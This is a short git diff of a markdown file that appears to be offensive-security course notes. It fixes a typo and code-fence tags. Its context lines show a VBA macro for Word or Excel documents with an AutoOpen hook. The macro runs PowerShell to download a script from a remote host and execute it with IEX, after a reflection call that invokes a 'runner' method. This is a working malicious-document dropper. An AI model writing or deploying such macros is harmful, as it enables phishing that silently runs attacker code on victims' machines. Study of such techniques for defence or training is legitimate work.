@@ -110,9 +110,9 @@ $method = $class.GetMethod("runner")
 $method.Invoke(0, $null)
 ```
 
-This VB macro would be embeded in the Word/Execel Document
+This VB macro would be embeded in the Word/Excel Document
 
-```vbapplication
+```vb
 Sub MyMacro()
 Dim str As String
 str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
@@ -123,4 +123,5 @@ MyMacro
 End Sub
 Sub AutoOpen()
 MyMacro
-End Sub```
+End Sub
+```
